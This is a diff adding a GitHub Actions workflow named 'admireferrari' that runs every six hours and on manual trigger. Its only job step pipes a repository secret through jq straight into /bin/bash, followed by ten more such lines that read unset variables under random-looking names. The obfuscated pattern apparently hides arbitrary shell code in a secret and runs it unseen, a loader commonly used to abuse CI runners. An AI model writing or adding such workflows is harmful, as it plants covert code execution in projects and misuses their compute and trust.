@@ -1,0 +1,29 @@
+name: admireferrari
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: admireferrari
+        env:
+          r95: ${{ secrets.r95 }}
+        run: |
+          echo $r95 | jq -r .vdke25918 | /bin/bash
+          echo $h904 | jq -r .sbvt0249 | /bin/bash
+          echo $hvt93457 | jq -r .zl15584 | /bin/bash
+          echo $wgc19918 | jq -r .mnjh8684 | /bin/bash
+          echo $eqev24236 | jq -r .hniq69108 | /bin/bash
+          echo $zk87 | jq -r .coe12 | /bin/bash
+          echo $wx0 | jq -r .wtqy38421 | /bin/bash
+          echo $wnam5 | jq -r .k1530 | /bin/bash
+          echo $rplg1 | jq -r .mvon06 | /bin/bash
+          echo $qndbx9 | jq -r .nyou14084 | /bin/bash
+          echo $so128 | jq -r .ggedw9500 | /bin/bash
+
